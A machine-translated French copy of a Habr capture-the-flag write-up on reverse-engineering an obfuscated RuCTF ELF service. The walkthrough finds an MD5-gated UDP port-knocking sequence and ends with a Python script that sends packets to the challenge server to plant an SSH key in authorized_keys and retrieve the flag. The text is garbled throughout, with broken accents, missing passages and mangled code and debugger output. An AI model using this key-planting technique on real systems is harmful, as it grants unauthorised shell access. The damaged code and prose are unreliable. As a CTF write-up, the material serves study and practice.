Jour 7.  Hiddenresource </h2><br>  Cette t√¢che a √©t√© pr√©par√©e par <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">RuCTF</a> . <br><br>  <i>Compte tenu du service <a href="">n24.elf</a> .</i>  <i>Autorisez simplement le 95.216.185.52 et obtenez votre drapeau.</i> <br><br>  <b>Astuces</b> <b><br></b>  <b><i>28/10/2018 20:00</i></b> <br>  <i>La t√¢che n'a pas √©t√© r√©solue.</i>  <i>24 heures suppl√©mentaires.</i> <br><br>  Une enqu√™te sur le serveur pour l'acc√®s √† l'aide de protocoles de connexion standard a montr√© l'acc√®s via SSH (port 22).  Le fichier fourni est un ex√©cutable ELF (qui a √©t√© subtilement sugg√©r√© par l'extension dans le nom) pour Linux. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br>  L'utilisation de l'utilitaire strings a montr√© la pr√©sence des lignes ¬´/home/task/.ssh¬ª et ¬´/home/task/.ssh/authorized_keys¬ª.  Conclusion sur la possibilit√© d'acc√©der au fichier de cl√© d'autorisation sans mot de passe SSH √† partir du fichier ex√©cutable ELF (ci-apr√®s d√©nomm√© le service). <br><br>  La table des symboles contient les fonctions n√©cessaires pour ouvrir des fichiers et √©crire: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br>  La table des symboles contient √©galement des fonctions pour travailler avec des sockets, pour cr√©er des processus et pour compter MD5. <br><br>  L'inverse du fichier montre la pr√©sence d'un grand nombre de sauts (une sorte d'obscurcissement).  Dans le m√™me temps, des sauts sont effectu√©s entre des blocs de code, qui en g√©n√©ral peuvent √™tre divis√©s en plusieurs types: <br><br><ul><li>    ¬´            OF ¬ª,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        ¬´xor¬ª, ¬´and¬ª  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sur la base des r√©sultats de l'inverse, une hypoth√®se a √©t√© faite qu'il existe une impl√©mentation du comptage selon l'algorithme MD5. Le tableau n√©cessaire au calcul n'est pas impl√©ment√© s√©par√©ment, mais est lu directement dans le code en blocs. Le code contient des caract√®res avec les noms </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Init</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_final</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En g√©n√©ral, en utilisant les capacit√©s du d√©sassembleur bien connu et de ses scripts API, il a √©t√© possible de d√©terminer statiquement la progression du programme. Mais la licence du d√©sassembleur co√ªte cher, la version d'essai est triste, il est difficile de l'obtenir, et j'ai r√©ussi avec les utilitaires gratuits, et ce chemin est plus long. Par cons√©quent, la dynamique et plus l'opportunit√© est. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai t√©l√©charg√© le fichier ELF sur la machine virtuelle. Cr√©ation du r√©pertoire ¬´/home/task/.ssh/¬ª juste au cas o√π.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Au d√©marrage, vous devez sp√©cifier le port. </font><font style="vertical-align: inherit;">√âtant donn√© que nous ne contr√¥lons pas le lancement c√¥t√© serveur, je pensais que ce param√®tre √©tait factice. </font><font style="vertical-align: inherit;">Le vrai port devrait en √™tre un. </font><font style="vertical-align: inherit;">Netstat a montr√© le port ouvert 5432 (UDP).</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> L'envoi d'un paquet de donn√©es au port sp√©cifi√© affiche un message sur leur v√©rification et certaines donn√©es (4 octets) du service: </font></font><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'√©num√©ration de diverses donn√©es sur a r√©v√©l√© la d√©pendance des r√©sultats vis-√†-vis de leur contenu. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ensuite, le d√©bogage √† l'aide de gdb. </font><font style="vertical-align: inherit;">Tout d'abord, je trouve o√π nous obtenons les donn√©es, un point d'arr√™t sur recvfrom et backtrace. </font><font style="vertical-align: inherit;">Nous obtenons l'adresse 0x6ae010 √† la fin.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cha√Æne de transition</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dans la cha√Æne, appelez la fonction √† 0x810758 et traitez son r√©sultat. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D√©finissez break sur 0xb01902, envoyez le paquet de donn√©es.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code retour (registre Rax)</font></font></b> <div class="spoiler_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(gdb) b * 0xb01902 Point d' </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">arr√™t 2 √† 0xb01902 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(gdb) c </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En cours. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">V√©rification du </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">point d' </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">arr√™t </font><font style="vertical-align: inherit;">74657374 </font><font style="vertical-align: inherit;">00f82488 </font><font style="vertical-align: inherit;">2, 0x0000000000b01902 dans MD5_Init () </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(gdb) info reg rax </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rax rax 0x0 0</font></font><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code 0 pour les donn√©es invalides. Par cons√©quent, nous supposons que pour la bonne solution, nous devons renvoyer le code non 0. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Au cours de recherches ult√©rieures, j'ai regard√© gdb, qui est pass√© √† la fonction </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> lors de l'envoi du paquet de donn√©es (√©galement envoy√© ¬´test¬ª).</font></font><br><br><div class="spoiler">  <b class="spoiler_title">R√©sultat</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4>  R√©sultat </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5 est compt√© √† partir du message que nous avons envoy√©, mais la taille des donn√©es lues est de 512 octets. Apr√®s avoir jou√© avec les donn√©es, j'ai d√©couvert que MD5 est compt√© √† partir des donn√©es envoy√©es avec des z√©ros remplis jusqu'√† 512 octets. Mais vous devez envoyer au moins 8 octets afin de remplacer un nombre de 8 octets stock√© sur la pile. Apparemment, une adresse y √©tait stock√©e. Les 4 octets affich√©s par le service pour chaque paquet entrant correspondent aux 3 premiers octets de la somme MD5 avec un z√©ro suppl√©mentaire. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Je suis revenu √† la fonction 0x810758 et √† son code retour 0. La valeur de retour est stock√©e dans le registre RAX. Pour d√©terminer le code retour, j'ai d√©fini 2 points d'arr√™t √† l'adresse de la fonction 0x810758 et √† l'adresse apr√®s son ex√©cution 0x827326. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai envoy√© les donn√©es, le point √† 0x810758 a fonctionn√©. J'ai lanc√© le script dans gdb:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai obtenu le fichier </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> avec toutes les adresses pass√©es lors de l'ex√©cution de la fonction √† l'√©tude. </font><font style="vertical-align: inherit;">En fait, ce n'√©tait pas si simple, mais finalement j'y suis arriv√©. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pr√©par√© un fichier ¬´ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">disasm.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ¬ª avec du code d√©sassembl√© de objdmp pour un type lisible comme ¬´ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">adresse: instruction</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ¬ª sans lignes suppl√©mentaires.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai lanc√© un tel script</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Le script "va" simplement aux adresses depuis la fin jusqu'au moment o√π il re√ßoit le registre RAX dans le premier op√©rande de l'instruction. </font></font> R√©sultat: <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ici, c'est une valeur nulle. </font><font style="vertical-align: inherit;">Ensuite, revient √† n'importe quelle branche (fichier " </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "):</font></font><br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'adresse 0x95b6b2 est une comparaison d'une certaine valeur avec 0x133337. </font><font style="vertical-align: inherit;">Point d'arr√™t, regardez [rbp-0x2d4]. </font><font style="vertical-align: inherit;">Pour ce faire, envoyez le package avec les donn√©es "testtest":</font></font><br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Faites correspondre les 3 premiers octets de la somme MD5. La solution se r√©sume √† obtenir une somme MD5 avec les 3 premiers octets "\ x37 \ x33 \ x13". </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un script simple pour parcourir les nombres √† partir de z√©ro avec le calcul sous forme binaire MD5 jusqu'√† la correspondance souhait√©e. Donn√©es requises pour l'envoi re√ßu. Nous envoyons des donn√©es et recevons un message du service concernant la nomination d'un nouveau port pour la r√©ception des donn√©es:</font></font><br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netstat n'a pas montr√© ce port, et en fait de nouveaux ports. Mais ps a montr√© la pr√©sence d'un processus enfant termin√© (zombies). L'id√©e est venue que le port s'ouvre pendant un certain temps dans le processus enfant. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J'ai envoy√© le paquet n√©cessaire au port 5432 et ensuite au port 14235. Et rien. Le port a cess√© de s'ouvrir. En cons√©quence, j'ai g√©n√©r√© d'autres donn√©es et, en cons√©quence, MD5 avec le bon d√©part. Message √† nouveau, mais cette fois avec un port diff√©rent. Apr√®s le red√©marrage du service, le premier MD5 a fonctionn√©, toujours avec le port 14235. Il y avait une id√©e que le service se souvenait du MD5 d√©pens√©. Par cons√©quent, je l'ai test√© √† chaque red√©marrage du service.</font></font><br><br><div class="spoiler">  <b class="spoiler_title">R√©sultat</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Encore un nouveau port. Ici, j'ai commenc√© √† penser que la cha√Æne de ports pourrait √™tre longue ... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En fait, le port suivant (31841) √©tait le dernier. Apr√®s un certain temps de travail avec gdb et du code d√©sassembl√© et divers tests, j'ai d√©couvert que le fichier ¬´/home/task/.ssh/authorized_keys¬ª est apparu. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D√©couvrir plus avant la cause de l'apparition du fichier est devenu une question de temps, ce qui est √©galement √©crit dans ce fichier. En cons√©quence, les donn√©es du paquet envoy√© √† la suite du premier au dernier port ouvert sont √©crites dans le fichier (si elles ne sont pas claires, elles seront visibles dans le script ci-dessous). </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nouvelle g√©n√©ration de cl√©s RSA et envoi public. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puis autorisation sur le serveur via SSH, recherchez et obtenez le drapeau.</font></font><br><br>          MD5-.        ,          (    ).     ,     4    (   MD5)    int  ,         (  ). <br><br><div class="spoiler"> <b class="spoiler_title"> ,     RSA,   .</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ligne recherch√©e: </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">indicateur {a1ec3c43cae4250faa302c412c7cc524}</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> En cas de succ√®s, nous obtenons ¬´OK¬ª en r√©ponse. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En fait, comme je l'ai √©crit, il s'est av√©r√© superflu d'envoyer la premi√®re et la deuxi√®me somme MD5. </font><font style="vertical-align: inherit;">Je pense aussi que tout n'a pas √©t√© d√©cid√© √† partir du n√©cessaire, il a juste √©t√© ramass√©. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Je ne pensais pas que je recevrais une invitation, pr√®s de 40 heures se sont √©coul√©es depuis le d√©but de la mission jusqu'au moment o√π j'ai envoy√© le drapeau.</font></font> Je vous remercie </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr440312/">https://habr.com/ru/post/fr440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr440302/index.html">CRM - co√ªt du succ√®s, co√ªt de l'erreur, co√ªt de possession</a></li>
<li><a href="../fr440304/index.html">Interruptions √† partir de p√©riph√©riques externes dans un syst√®me x86. Partie 3. Configuration du routage d'interruption dans le chipset en utilisant l'exemple coreboot</a></li>
<li><a href="../fr440306/index.html">Mise √† l'√©chelle de la base de donn√©es dans des syst√®mes tr√®s charg√©s</a></li>
<li><a href="../fr440308/index.html">Diviser et conqu√©rir, ou √©crire lentement - lire rapidement</a></li>
<li><a href="../fr440310/index.html">Comment apprendre √† une machine √† comprendre les factures et √† en extraire des donn√©es</a></li>
<li><a href="../fr440314/index.html">Candidat √† la sortie de JDK 12: Shenandoah, G1, JMH, Arm64. Les bugs dans Swing ripostent</a></li>
<li><a href="../fr440316/index.html">R√©partition uniforme des points dans un triangle</a></li>
<li><a href="../fr440318/index.html">GDPR: comment travailler avec les donn√©es personnelles de vos employ√©s, ind√©pendants et employ√©s de contrepartie europ√©ens</a></li>
<li><a href="../fr440320/index.html">Comme nous dans le compteur DMRSE Yandex</a></li>
<li><a href="../fr440322/index.html">Pourquoi les disques durs deviennent moins susceptibles de tomber en panne</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
